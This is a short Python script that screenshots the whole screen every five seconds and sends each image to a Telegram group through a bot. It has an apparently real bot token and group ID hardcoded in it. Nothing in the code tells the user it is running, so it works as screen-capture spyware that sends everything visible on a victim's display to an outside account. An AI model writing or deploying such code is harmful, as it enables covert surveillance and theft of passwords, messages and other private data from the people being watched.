from pyscreenshot import grab
from io import BytesIO
from telebot import TeleBot
from time import sleep

TOKEN = "6686069769:AAF_o7LYROvKm7xP4Uv7lwz13ghq12RYUWc"
GROUP_ID = -4162568284

bot = TeleBot(TOKEN)

def take_screenshot():
    screenshot = grab()
    screenshot_bytes = BytesIO()
    screenshot.save(screenshot_bytes, format='PNG')
    screenshot_bytes.seek(0)
    bot.send_photo(GROUP_ID, screenshot_bytes)

while True:
    take_screenshot()
    sleep(5)
